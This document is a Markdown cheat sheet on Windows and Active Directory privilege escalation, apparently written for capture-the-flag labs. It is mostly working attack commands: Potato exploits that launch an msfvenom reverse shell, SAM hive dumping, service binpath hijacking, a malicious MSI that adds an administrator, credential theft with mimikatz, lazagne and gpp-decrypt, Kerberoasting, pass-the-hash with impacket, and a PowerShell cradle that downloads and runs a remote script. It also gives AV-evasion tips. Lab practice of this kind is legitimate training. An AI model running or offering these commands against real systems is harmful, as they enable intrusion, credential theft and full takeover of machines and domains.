# Windows privilege escalation

`whoami; whoami /priv; whoami /groups` first — token privileges decide the
whole path. Then `systeminfo` (OS build), `net user`, `net localgroup
administrators`. Transfer `scripts/`-served winpeas.exe or run the manual
blocks below.

## 1. whoami /priv decision table

| Privilege | Path |
|---|---|
| `SeImpersonatePrivilege` (service accounts, IIS) | Potato family — pick by build, below |
| `SeBackupPrivilege` | copy SAM/SYSTEM hives → `impacket-secretsdump` offline → pass-the-hash |
| `SeRestorePrivilege` | overwrite system files as SYSTEM |
| `SeLoadDriverPrivilege` | load a vulnerable driver (BYOVD) — box-specific |
| `SeTakeOwnershipPrivilege` | take ownership of any file → utilman/sethc swap |
| `SeDebugPrivilege` | migrate into SYSTEM process (e.g. via meterpreter/`ps`+inject) |

### Potato family (SeImpersonate)

| Build | Tool |
|---|---|
| ≤ Server 2016 / Win10 ≤ 1809 | JuicyPotato (DCOM/NTLM relay to local RPC) |
| Win10 1809–21H1, Server 2019 | PrintSpoofer (printer bug → SYSTEM) |
| Win10/11, Server 2019–2022 (incl. patched DCOM) | GodPotato (generic Potato via .NET GenericUntrusted…) |

All follow the same shape: `JuicyPotato.exe -l 9001 -p c:\x\rev.exe -t *`,
`PrintSpoofer.exe -i -c "c:\x\rev.exe"`, `GodPotato.exe -cmd "c:\x\rev.exe"`
(exact flags per tool's README; always generate `rev.exe` with msfvenom
`windows/x64/shell_reverse_tcp`). SweetPotato bundles several trigger types
when you're unsure which works on the build.

### SeBackupPrivilege

```powershell
reg save hklm\sam c:\temp\sam; reg save hklm\system c:\temp\system
# exfil both, then on host:
.venv/bin/impacket-secretsdump -sam sam -system system LOCAL
```

## 2. Services

Unquoted service paths with spaces + writable intermediate dir:

```powershell
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
# for each unquoted path, check each parent dir: can we write? drop
# "C:\Program.exe" / "C:\Program Files\X.exe" hijack + restart service
sc qc <name>        # BINARY_PATH_NAME, runs as who (look for SYSTEM)
```

Writable service binary or binPATH:

```powershell
# PowerShell ACL check on the binary + its dir
Get-Acl 'C:\path\to\service.exe' | Format-List Path,Owner,AccessToString
accesschk.exe /accepteula -ucqv <name>     # Sysinternals on target, if transferable
# binPATH overwrite (needs SERVICE_CHANGE_CONFIG):
sc config <name> binpath= "c:\x\rev.exe"; sc stop <name>; sc start <name>
```

Service credentials in registry:

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services /s /v ObjectName | findstr /i "user"
reg query "HKLM\<svc>\Parameters" /s        # some services store passwords here
```

## 3. AlwaysInstallElevated

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both = 1 → any MSI installs as SYSTEM:

```bash
msfvenom -p windows/x64/exec CMD='net localgroup administrators <user> /add' -f msi -o add.msi
```
```powershell
msiexec /quiet /qn /i c:\temp\add.msi
```

## 4. Scheduled tasks, startup, autologon

```powershell
schtasks /query /fo LIST /v | findstr /i "taskname run as user"
Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword    # autologon
```

## 5. Credential hunting

| Source | Command |
|---|---|
| saved creds | `cmdkey /list` then `runas /savecred /user:<user> cmd.exe` |
| registry creds | `reg query HKCU\Software\SimonTatham\PuTTY\Sessions` (proxy creds) |
| RDP saved | `cmdkey /list`; mimikatz `dpapi` realm on lab boxes |
| browser/wifi | lazagne.exe (fetch once into toolbox/) |
| unattend/sysprep | `dir /s C:\Windows\Panther\unattend.xml` → plaintext or GPP `cpassword` |
| GPP cpassword | `gpp-decrypt <blob>` — ships with `.venv` impacket (`.venv/bin/gpp-decrypt`) |
| files | `dir /s *pass* *cred* *.kdbx C:\Users 2>nul` |

## 6. Active Directory context (box is domain-joined)

BloodHound collection — prefer the python ingestor (never touches the target):

```bash
uv pip install --python .venv/bin/python bloodhound-python   # once
.venv/bin/bloodhound-python -d <domain> -u <user> -p <pw> -ns <dc-ip> -c All
```

(SharpHound.ps1 on target is the alternative: `Import-Module .\SharpHound.ps1;
Invoke-BloodHound -CollectionMethod All`.) Then in BloodHound GUI (podman the
`bloodhound` image if desired) run "Shortest Path to Domain Admins" from your
user — follow whatever edge it shows (WriteDacl, ForceChangePassword, ACL
abuse). GUI itself: install upstream BloodHound app release, neo4j backend.

Kerberoast (any domain user):

```bash
.venv/bin/impacket-GetUserSPNs <domain>/<user>:<pw> -dc-ip <dc> -request
hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt   # pacman wordlists or fetch
```

Pass-the-hash / offline dump:

```bash
.venv/bin/impacket-secretsdump <domain>/<user>:<pw>@<dc>       # or -hashes :NTLM
.venv/bin/impacket-psexec <domain>/<user>@<target> -hashes :<NTLM>
.venv/bin/impacket-wmiexec  <domain>/<user>@<target> -hashes :<NTLM>
```

LAPS: the local admin password lives in the `ms-Mcs-AdmPwd` attribute, readable
only by the configured LAPS read group. Check your groups against that, then
read it via LDAP from Linux (`ldapsearch` against the DC with
`ms-Mcs-AdmPwd`) or PowerShell with RSAT (`Get-ADObject -Filter 'Name -like
"*"' -Properties ms-Mcs-AdmPwd`).

## 7. AV awareness

- Defender is on by default in these labs. Transfers of winpeas/mimikatz get
  eaten: stage via `certutil` still works, execution may not. Prefer
  living-off-the-land (PowerShell `Invoke-*` downloaded with
  `powershell -c "iex(New-Object Net.WebClient).DownloadString('http://VPNIP/x.ps1')"`),
  AMSI-bypass one-liners, or `scp`-style copy+rename.
- Obfuscate payload names/extensions (`p.txt` → rename on box), avoid
  mass-encoding: if AV kills you, pivot to LOLBins
  (`certutil -urlcache`, `mshta`, `rundll32`) rather than escalating obfuscation.
- Sysmon/auditd watching: irrelevant on HTB, decisive in KOTH (see
  `references/koth.md`).

## 8. Automation

winpeas.exe (fetch once from upstream releases into `toolbox/`, serve over
`impacket-smbserver`/http) enumerates 1–5 in one shot. PowerShell
`PowerUp.ps1` (`Invoke-AllChecks`) covers the service misconfigs. Verify every
finding manually before acting on it.
